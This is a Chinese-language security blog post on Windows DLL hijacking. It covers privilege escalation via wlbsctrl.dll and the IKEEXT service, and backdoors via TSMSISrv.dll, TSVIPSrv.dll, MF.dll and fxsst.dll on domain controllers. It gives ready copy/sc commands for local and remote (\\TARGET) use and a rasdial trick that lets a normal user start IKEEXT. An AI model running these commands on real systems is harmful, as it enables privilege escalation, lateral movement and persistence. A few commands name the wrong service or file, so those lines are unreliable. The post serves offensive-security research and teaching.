---
layout: post
title: 《Lateral Movement — SCM and DLL Hijacking Primer》的利用扩展
---


## 0x00 前言
---

《Lateral Movement — SCM and DLL Hijacking Primer》介绍了三个dll(wlbsctrl.dll、TSMSISrv.dll和TSVIPSrv.dll)可以通过SCM(Service Control Manager)实现远程执行。本文将要扩展这三个dll的用法，分别介绍提权和后门利用的方法

文章链接：

https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992

## 0x01 简介
---

本文将要介绍以下内容：

- 利用wlbsctrl.dll实现的提权
- 利用TSMSISrv.dll和TSVIPSrv.dll实现的后门
- 利用MF.dll实现的后门

## 0x03 wlbsctrl.dll的利用
---

### 1、原文中的用法

IKEEXT(IKE and AuthIP IPsec Keying Modules)服务在启动时会加载wlbsctrl.dll，但Windows系统默认配置下该dll不存在，如果我们将自己的dll放在这个位置，在服务启动时就能加载该dll

POC：

https://github.com/djhohnstein/wlbsctrl_poc

测试系统： Win7 x64

这里使用的dll不需要指定导出函数，所以可以直接使用之前我的测试dll：

https://github.com/3gstudent/test/raw/master/calc_x64.dll

本地执行的用法：
(需要管理员权限)

```
copy calc_x64.dll C:\Windows\System32\wlbsctrl.dll
sc query IKEEXT
sc stop IKEEXT
sc start IKEEXT
```

远程执行的用法：

```
copy calc_x64.dll \\TARGET\C$\Windows\System32\wlbsctrl.dll
sc \\TARGET query IKEEXT
sc \\TARGET stop IKEEXT
sc \\TARGET start IKEEXT
```

### 2、利用wlbsctrl.dll实现的提权

POC：

https://github.com/itm4n/Ikeext-Privesc

实现原理：

#### 1. IKEEXT(IKE and AuthIP IPsec Keying Modules)服务在启动时会加载wlbsctrl.dll，但并未指定绝对路径

**注：**

程序在调用DLL时，如果未指明DLL的完整路径，那么系统会按照一套固定的搜索顺序寻找DLL

如果SafeDllSearchMode开启，程序会依次从以下位置查找DLL文件：

- The directory from which the application loaded
- The system directory
- The 16-bit system directory
- The Windows directory
- The current directory
- The directories that are listed in the PATH environment variable

如果关闭，则从以下位置查找DLL文件：

- The directory from which the application loaded
- The current directory
- The system directory
- The 16-bit system directory
- The Windows directory
- The directories that are listed in the PATH environment variable

详细内容见：

https://msdn.microsoft.com/en-us/library/ms682586(VS.85).aspx

#### 2. Windows系统默认配置下不存在wlbsctrl.dll，如果我们能够找到满足条件的PATH环境变量(普通用户权限可写)，就能实现dll劫持，加载我们自己的dll

#### 3. 普通用户权限能够启动IKEEXT服务，方法如下：

生成文件rasphone.pbk:

```
[IKEEXT]
MEDIA=rastapi
Port=VPN2-0
Device=Wan Miniport (IKEv2)
DEVICE=vpn
PhoneNumber=127.0.0.1
```

命令行执行：

```
rasdial IKEEXT test test /PHONEBOOK:rasphone.pbk
```

**注：**

这个漏洞很古老，早在2012年10月9日被公开

https://www.immuniweb.com/advisory/HTB23108

## 0x04 TSMSISrv.dll和TSVIPSrv.dll的利用
---

### 1、原文中的用法

SessionEnv(Remote Desktop Configuration)服务在启动时会加载`C:\Windows\System32\TSMSISrv.dll`和`C:\Windows\System32\TSVIPSrv.dll`，但Windows系统默认配置下这两个dll不存在，如果我们将自己的dll放在这个位置，在服务启动时就能加载该dll

POC：

https://github.com/djhohnstein/TSMSISrv_poc

测试系统： Win7 x64

POC添加了导出函数`StartComponent`、`StopComponent`、`OnSessionChange`和`Refresh`

我的测试环境下dll不需要指定导出函数，所以可以直接使用之前我的测试dll：

https://github.com/3gstudent/test/raw/master/calc_x64.dll

本地执行的用法：
(需要管理员权限)

```
copy calc_x64.dll C:\Windows\System32\TSMSISrv.dll
sc query IKEEXT
sc stop IKEEXT
sc start IKEEXT
```

或者

```
copy calc_x64.dll C:\Windows\System32\TSVIPSrv.dll
sc query IKEEXT
sc stop IKEEXT
sc start IKEEXT
```

远程执行的用法：

```
copy calc_x64.dll \\TARGET\C$\Windows\System32\TSMSISrv.dll
sc \\TARGET query IKEEXT
sc \\TARGET stop IKEEXT
sc \\TARGET start IKEEXT
```

或者

```
copy calc_x64.dll \\TARGET\C$\Windows\System32\TSVIPSrv.dll
sc \\TARGET query IKEEXT
sc \\TARGET stop IKEEXT
sc \\TARGET start IKEEXT
```

### 2、利用TSMSISrv.dll和TSVIPSrv.dll实现的后门

如果系统开启了远程桌面的功能(支持远程连接到此计算机)，就会开启SessionEnv(Remote Desktop Configuration)服务

如果我们在`C:\Windows\System32\`下写入TSMSISrv.dll或TSVIPSrv.dll，就能在服务启动时加载该dll，实现代码执行

**应用场景：**

获得域控制器文件的远程访问权限，但无法远程执行命令

**解决方法：**

1.如果域控制器未开启远程桌面的功能，在系统启动时劫持Explorer.exe对fxsst.dll的加载

写入文件`C:\Windows\fxsst.dll`

2.如果域控制器开启了远程桌面的功能，在系统启动时将开启SessionEnv服务，加载TSMSISrv.dll或TSVIPSrv.dll

写入文件`C:\Windows\System32\TSMSISrv.dll`或`C:\Windows\System32\TSMSISrv.dll`

3.如果域控制器开启了远程桌面的功能，在用户进行远程桌面连接时将会加载MF.dll

**实际测试：**

测试环境： Server2012R2 x64

写入文件`C:\Windows\System32\MF.dll`，命令如下:

```
copy calc_x64.dll C:\Windows\System32\MF.dll
```

等待用户连接远程桌面，连接成功后加载MF.dll，弹出计算器，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-24/2-1.png)

## 0x05 小结
---

本文介绍了三个利用方法：利用wlbsctrl.dll实现的提权、利用TSMSISrv.dll/TSVIPSrv.dll实现的后门和利用MF.dll实现的后门，其中MF.dll可以用来解决获得域控制器文件的远程访问权限，但无法远程执行命令的问题。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


